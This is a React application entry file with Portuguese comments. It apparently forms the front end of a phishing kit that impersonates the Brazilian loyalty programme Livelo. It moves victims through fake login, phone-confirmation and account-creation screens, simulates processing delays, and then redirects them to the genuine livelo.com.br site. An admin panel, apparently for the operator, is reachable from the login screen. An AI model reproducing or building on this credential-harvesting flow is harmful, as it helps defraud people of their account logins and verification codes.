import React, { useState } from "react";
import { Analytics } from "@vercel/analytics/react";
import Login from "./components/Login";
import PhoneConfirmation from "./components/PhoneConfirmation";
import CreateAccount from "./components/CreateAccount";
import AdminPanel from "./components/AdminPanel";
import Loading from "./components/Loading";
import "./App.css";

function App() {
  const [currentScreen, setCurrentScreen] = useState("login");
  const [userEmail, setUserEmail] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleLoginSuccess = (email) => {
    setUserEmail(email);
    setIsLoading(true);

    // Simula tempo de processamento
    setTimeout(() => {
      setIsLoading(false);
      setCurrentScreen("phone");
    }, 1500);
  };

  const handleGoToCreateAccount = () => {
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setCurrentScreen("create");
    }, 800);
  };

  const handleAccountCreated = (data) => {
    console.log("Conta criada:", data);
    setUserEmail(data.email);
    setIsLoading(true);

    // Mostra loading por 2 segundos e depois redireciona para o site da Livelo
    setTimeout(() => {
      window.location.href = "https://www.livelo.com.br/";
    }, 2000);
  };

  const handleBackToLogin = () => {
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setCurrentScreen("login");
    }, 800);
  };

  const handleCodeSent = (phone) => {
    console.log("Código enviado para:", phone);
    setIsLoading(true);

    // Mostra loading por 2 segundos e depois redireciona para o site da Livelo
    setTimeout(() => {
      window.location.href = "https://www.livelo.com.br/";
    }, 2000);
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return (
          <Login
            onLoginSuccess={handleLoginSuccess}
            onGoToCreate={handleGoToCreateAccount}
            onGoToAdmin={() => setCurrentScreen("admin")}
          />
        );
      case "phone":
        return (
          <PhoneConfirmation
            userEmail={userEmail}
            onBack={handleBackToLogin}
            onCodeSent={handleCodeSent}
          />
        );
      case "create":
        return (
          <CreateAccount
            onAccountCreated={handleAccountCreated}
            onBack={handleBackToLogin}
          />
        );
      case "admin":
        return <AdminPanel onBack={handleBackToLogin} />;
      default:
        return <Login onLoginSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="App">
      {isLoading && <Loading />}
      {renderScreen()}
      <Analytics />
    </div>
  );
}

export default App;
